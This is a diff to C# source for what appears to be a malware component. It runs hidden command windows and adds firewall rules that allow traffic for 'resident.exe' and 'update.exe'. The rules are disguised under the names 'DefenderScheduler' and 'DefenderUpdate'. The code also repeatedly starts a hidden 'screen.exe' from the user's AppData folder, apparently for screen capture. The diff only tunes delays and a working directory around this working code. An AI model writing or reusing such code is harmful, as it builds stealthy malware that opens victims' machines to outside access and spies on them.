@@ -54,6 +54,7 @@ namespace features
 					str += string.Concat( "innerException: ", ex.InnerException.Message );
 
 				Console.WriteLine( str );
+
 				new ManualResetEvent( false ).WaitOne( );
 			}
 		}
@@ -80,12 +81,16 @@ namespace features
 			startInfo.WindowStyle = ProcessWindowStyle.Hidden;
 			startInfo.Arguments = $"/C netsh advfirewall firewall delete rule name=DefenderScheduler";
 			Process.Start( startInfo );
+			Thread.Sleep( 500 );
 			startInfo.Arguments = $"/C netsh advfirewall firewall delete rule name=DefenderUpdate";
 			Process.Start( startInfo );
+			Thread.Sleep( 500 );
 			startInfo.Arguments = $"/C netsh advfirewall firewall add rule name=DefenderScheduler dir=in action=allow program=\"{Environment.CurrentDirectory}\\resident.exe\" enable=yes ";
 			Process.Start( startInfo );
+			Thread.Sleep( 500 );
 			startInfo.Arguments = $"/C netsh advfirewall firewall add rule name=DefenderScheduler dir=out action=allow program=\"{Environment.CurrentDirectory}\\resident.exe\" enable=yes ";
 			Process.Start( startInfo );
+			Thread.Sleep( 500 );
 			startInfo.Arguments = $"/C netsh advfirewall firewall add rule name=DefenderUpdate dir=out action=allow program=\"{Environment.CurrentDirectory}\\update.exe\" enable=yes ";
 			Process.Start( startInfo );
 			Thread.Sleep( 1000 );
@@ -102,10 +107,11 @@ namespace features
 					startInfo.CreateNoWindow = true;
 					startInfo.FileName = "cmd.exe";
 					startInfo.WindowStyle = ProcessWindowStyle.Hidden;
+					startInfo.WorkingDirectory = $"{Environment.GetFolderPath( Environment.SpecialFolder.ApplicationData )}\\Screen";
 					startInfo.Arguments = $"/C start {Environment.GetFolderPath( Environment.SpecialFolder.ApplicationData )}\\Screen\\screen.exe";
 					Process.Start( startInfo );
 				}
-				Thread.Sleep( 10000 );
+				Thread.Sleep( 7000 );
 			}
 		}
 		static void update( )
